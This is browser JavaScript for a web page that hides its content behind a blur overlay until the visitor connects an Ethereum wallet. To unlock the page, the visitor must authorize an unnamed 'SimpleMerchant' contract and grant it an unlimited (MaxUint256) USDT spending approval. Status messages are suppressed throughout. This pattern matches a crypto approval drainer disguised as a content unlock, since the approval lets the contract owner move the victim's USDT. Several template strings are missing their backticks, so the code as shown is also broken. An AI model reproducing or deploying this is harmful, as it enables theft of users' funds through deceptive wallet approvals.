const ETHEREUM_CONTRACT_ADDRESS = '0xda52f92e86fd499375642cd269f624f741907a8f';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT Mainnet Address
const CONTRACT_ABI = [
"function connectAndAuthorize() external",
"function authorized(address customer) external view returns (bool)",
"event Authorized(address indexed customer)"
];
const USDT_ABI = [
"function approve(address spender, uint256 amount) external returns (bool)",
"function balanceOf(address) view returns (uint256)",
"function allowance(address owner, address spender) external view returns (uint256)"
];
const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;
// Stores event listener references to remove old listeners on re-initialization
let accountChangeListener = null;
let chainChangeListener = null;
const overlay = document.getElementById('blurOverlay'); // 新增：獲取遮罩元素
const overlayMessage = document.getElementById('overlayMessage'); // 新增：獲取遮罩訊息元素
// --- 遮罩控制函數 ---
function hideOverlay() {
overlay.style.opacity = '0';
setTimeout(() => {
overlay.style.display = 'none';
}, 300); // 等待淡出效果完成
}
function showOverlay(message) {
overlayMessage.innerHTML = message;
overlay.style.display = 'flex';
setTimeout(() => {
overlay.style.opacity = '1';
}, 10);
}
// --- initializeWallet 函數 (僅保留錯誤/必要訊息) ---
async function initializeWallet() {
try {
if (typeof window.ethereum === 'undefined') {
updateStatus('Please install MetaMask or a supported wallet'); // 顯示必要錯誤
showOverlay('請安裝 MetaMask 或支援的錢包以繼續');
return;
}
provider = new ethers.BrowserProvider(window.ethereum);
// Remove old listeners to prevent duplicate bindings
if (accountChangeListener) window.ethereum.removeListener('accountsChanged', accountChangeListener);
if (chainChangeListener) window.ethereum.removeListener('chainChanged', chainChangeListener);
// Check network and switch to Mainnet
const network = await provider.getNetwork();
if (network.chainId !== 1n) { // 1n is Mainnet Chain ID
updateStatus('Switching to Ethereum Mainnet...'); // 顯示切換網路的警告/提示
showOverlay('正在嘗試切換到以太坊主網... 請在錢包中確認');
try {
await window.ethereum.request({
method: 'wallet_switchEthereumChain',
params: [{ chainId: '0x1' }]
});
// Re-initialize provider after successful switch
provider = new ethers.BrowserProvider(window.ethereum);
await provider.getNetwork();
} catch (switchError) {
if (switchError.code === 4001) {
updateStatus('User rejected network switch. Please manually switch to Ethereum Mainnet.'); // 顯示錯誤
showOverlay('用戶拒絕切換網絡。請手動切換到 Ethereum Mainnet。');
} else {
updateStatus(Network switch failed: ${switchError.message}); // 顯示錯誤
showOverlay(網絡切換失敗: ${switchError.message});
}
return;
}
}
const accounts = await provider.send('eth_accounts', []);
if (accounts.length > 0) {
userAddress = accounts[0];
signer = await provider.getSigner();
// Initialize contracts with signer
contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
// ** 連線已恢復，直接檢查授權，不顯示進度文字 **
updateStatus(''); // 清空/隱藏狀態欄
await checkAuthorization();
} else {
updateStatus(''); // 隱藏狀態欄
showOverlay('請連繫錢包以解鎖內容');
}
// Account change listener, simplified to re-initialize
accountChangeListener = (accounts) => {
if (accounts.length === 0) {
resetState();
updateStatus('Wallet disconnected'); // 顯示斷開連繫的提示
} else {
initializeWallet();
}
};
window.ethereum.on('accountsChanged', accountChangeListener);
// Network change listener
chainChangeListener = () => {
resetState();
updateStatus('Network changed, please reconnect wallet'); // 顯示網路變化的提示
window.location.reload();
};
window.ethereum.on('chainChanged', chainChangeListener);
} catch (error) {
updateStatus(Initialization failed: ${error.message}); // 顯示初始化失敗的錯誤
console.error("Initialize Wallet Error:", error);
showOverlay(初始化失敗: ${error.message});
}
}
// --- checkAuthorization 函數 (邏輯不變，僅調整 updateStatus 呼叫) ---
async function checkAuthorization() {
try {
if (!signer || !userAddress || !contract || !usdtContract) {
showOverlay('錢包未準備好。請連線。');
return;
}
const isAuthorized = await contract.authorized(userAddress);
const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
const maxAllowance = ethers.MaxUint256;
let usdtBalance = 0n;
try {
usdtBalance = await usdtContract.balanceOf(userAddress);
} catch(e) { /* Ignore balance read error */ }
let statusMessage = '';
const isUsdtMaxApproved = usdtAllowance >= maxAllowance / 2n;
// Check SimpleMerchant contract authorization
if (isAuthorized) {
statusMessage += 'SimpleMerchant contract authorized ✅. '; // SimpleMerchant 合約已授權
} else {
statusMessage += 'SimpleMerchant contract NOT authorized ❌. '; // SimpleMerchant 合約未授權
}
// Check USDT authorization
statusMessage += USDT Balance: ${ethers.formatUnits(usdtBalance, 6)}. ; // USDT 餘額
if (isUsdtMaxApproved) {
statusMessage += USDT approved for MaxUint256 ✅.; // USDT 已授權足夠金額 (MaxUint256)
} else if (usdtAllowance > 0n) {
statusMessage += USDT approval amount insufficient ⚠️.; // USDT 已授權不足
} else {
statusMessage += USDT not approved or approval is zero ❌.; // USDT 未授權或授權為零
}
// Button state: needs to be clicked if authorization is incomplete
const allAuthorized = isAuthorized && isUsdtMaxApproved;
if (allAuthorized) {
connectButton.classList.add('connected');
connectButton.title = 'Disconnect Wallet'; // 斷開錢包
connectButton.disabled = false;
updateStatus(''); // 成功時，清空/隱藏狀態欄
hideOverlay(); // 完全授權，隱藏遮罩
} else {
connectButton.classList.remove('connected');
connectButton.title = 'Connect Wallet (Complete Authorization)'; // 連繫錢包 (完成授權)
connectButton.disabled = false;
updateStatus(''); // 授權未完成，清空/隱藏狀態欄
showOverlay('需要完成合約和 USDT 授權才能查看內容。點擊右上角按鈕開始交易。'); // 授權未完成，顯示遮罩
}
} catch (error) {
updateStatus(Authorization check failed: ${error.message}); // 顯示錯誤
console.error("Check Authorization Error:", error);
showOverlay(檢查授權失敗: ${error.message});
}
}
// --- connectWallet 函數 (移除所有中間狀態更新) ---
async function connectWallet() {
try {
if (typeof window.ethereum === 'undefined') {
updateStatus('Please install MetaMask or a supported wallet');
return;
}
updateStatus(''); // 連線開始，隱藏狀態欄
showOverlay('請在您的錢包中確認連線請求...');
// Request wallet connection (MetaMask will confirm or maintain connection)
await provider.send('eth_requestAccounts', []);
// Re-get signer and contract instances
signer = await provider.getSigner();
userAddress = await signer.getAddress();
contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
// Check ETH balance (for Gas Fee)
const ethBalance = await provider.getBalance(userAddress);
const requiredEthForGas = ethers.parseEther('0.001');
if (ethBalance < requiredEthForGas) {
updateStatus(Warning: ETH balance may be insufficient for authorization transactions (Suggested min ${ethers.formatEther(requiredEthForGas)} ETH, Actual ${ethers.formatEther(ethBalance)} ETH).); // 顯示 Gas 費不足警告
} else {
updateStatus(''); // 隱藏狀態欄
}
// 1. Check and execute SimpleMerchant contract authorization (connectAndAuthorize)
const isAuthorized = await contract.authorized(userAddress);
if (!isAuthorized) {
updateStatus(''); // 隱藏進度
showOverlay('1/2: 請在錢包中簽署 SimpleMerchant 合約授權 交易...');
const txAuthorize = await contract.connectAndAuthorize();
await txAuthorize.wait();
updateStatus(''); // 隱藏成功訊息
} else {
updateStatus(''); // 隱藏已授權訊息
}
// 2. Check and execute USDT token approval (approve)
const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
const maxAllowance = ethers.MaxUint256;
// Re-approve if approval is not MaxUint256 (or close)
if (usdtAllowance < maxAllowance) {
updateStatus(''); // 隱藏進度
showOverlay('2/2: 請在錢包中簽署 USDT 代幣 MaxUint256 授權 交易...');
const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
await txApprove.wait();
updateStatus(''); // 隱藏成功訊息
} else {
updateStatus(''); // 隱藏已授權訊息
}
// Final check and update button appearance
await checkAuthorization();
updateStatus(''); // 連線成功，隱藏狀態欄
} catch (error) {
updateStatus(Operation failed: ${error.message}); // 顯示操作失敗的錯誤
console.error("Connect Wallet Error:", error);
connectButton.classList.remove('connected');
connectButton.title = 'Connect Wallet'; // 連繫錢包
connectButton.disabled = false;
showOverlay(操作失敗。請重試或手動檢查連線。錯誤: ${error.message.slice(0, 50)}...);
}
}
// --- 其他函數 (保持不變) ---
function disconnectWallet() {
resetState();
updateStatus('Wallet disconnected, please reconnect.'); // 顯示斷開連繫的提示
alert('Wallet disconnected. To fully remove site access from MetaMask, please manually remove this site from "Connected Sites" in MetaMask settings.'); // 提示用戶手動斷開
showOverlay('錢包已斷開連繫，請連繫以解鎖內容'); // 斷開時顯示遮罩
}
function resetState() {
signer = null;
userAddress = null;
contract = null;
usdtContract = null;
connectButton.classList.remove('connected');
connectButton.title = 'Connect Wallet'; // 連繫錢包
connectButton.disabled = false;
updateStatus(''); // 重設時清空狀態欄
showOverlay('請連繫錢包以解鎖內容 🔒'); // 重設時顯示遮罩
}
/**
核心功能：控制狀態欄的隱藏與顯示。
*/
function updateStatus(message) {
const statusDiv = document.getElementById('status');
if (message) {
statusDiv.innerHTML = ${message};
statusDiv.style.display = 'block'; // 顯示內容
} else {
statusDiv.innerHTML = '';
statusDiv.style.display = 'none'; // 隱藏整個區塊
}
}
// Listen for connect button click
connectButton.addEventListener('click', () => {
if (connectButton.classList.contains('connected')) {
disconnectWallet();
} else {
connectWallet();
}
});
// Initialize wallet state on page load
initializeWallet();
console.log('connectButton event listener added and initializeWallet called'); 